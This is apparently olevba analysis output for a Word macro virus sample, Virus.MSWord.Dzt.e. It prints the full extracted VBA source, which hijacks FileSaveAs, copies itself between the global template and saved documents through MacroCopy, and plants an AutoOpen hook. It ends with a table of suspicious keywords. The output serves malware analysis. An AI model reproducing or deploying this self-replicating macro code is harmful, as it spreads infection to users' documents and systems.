olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Dzt.e-6a16733a813f7aee4231efcabb972be6e354d14d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Dzt.e-6a16733a813f7aee4231efcabb972be6e354d14d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: Virus.MSWord.Dzt.e-6a16733a813f7aee4231efcabb972be6e354d14d - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim FileBaru$, FileMacro$
Dim salah

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
FileBaru$ = ""
FileMacro$ = ""
salah = 0
WordBasic.DisableInput (1)
WordBasic.DisableAutoMacros (1)
On Error GoTo -1: On Error GoTo CekError
FileMacro$ = WordBasic.[MacroFileName$]()
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
FileBaru$ = WordBasic.[FileName$]()
CopyToFile
If salah <> 0 Then CopyToGlobal
Aksi
WordBasic.FileSaveAs dlg
GoTo Selesai

CekError:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Selesai:
End Sub

Private Sub CopyToFile()
On Error GoTo -1: On Error GoTo finish
CekCopyToFile
If salah = 0 Then
    CopyAOF
End If
finish:
End Sub

Private Sub CekCopyToFile()
On Error GoTo -1: On Error GoTo fin
WordBasic.MacroCopy "Global:FileSaveAs", FileBaru$ + ":FileSaveAs", 1
fin:
salah = Err.Number
End Sub

Private Sub CopyToGlobal()
On Error GoTo -1: On Error GoTo fin
CopyAOtoG
WordBasic.MacroCopy FileMacro$ + ":FileSaveAs", "Global:FileSaveAs", 1
fin:
salah = Err.Number
End Sub

Private Sub CopyAOtoG()
On Error GoTo -1: On Error GoTo finish
WordBasic.MacroCopy FileMacro$ + ":AutoOpen", "Global:FileSave", 1
finish:
End Sub

Private Sub CopyAOF()
On Error GoTo -1: On Error GoTo finish
    WordBasic.MacroCopy "Global:FileSave", FileBaru$ + ":AutoOpen", 1
finish:
End Sub

Private Sub Aksi()
On Error GoTo -1: On Error GoTo finish
WordBasic.FileSummaryInfo Comments:="DZT'96" + Chr(13) + "(c)9 April 1996 by Hikmat S/D0E94328" + Chr(13) + "comp. dept. of HFT" + Chr(13) + "Instrumentasi Elektronika" + Chr(13) + "MIPA Terapan Fakultas MIPA" + Chr(13) + "Universitas Padjadjaran" + Chr(13) + "Bandung"
finish:
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Dzt.e-6a16733a813f7aee4231efcabb972be6e354d14d - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

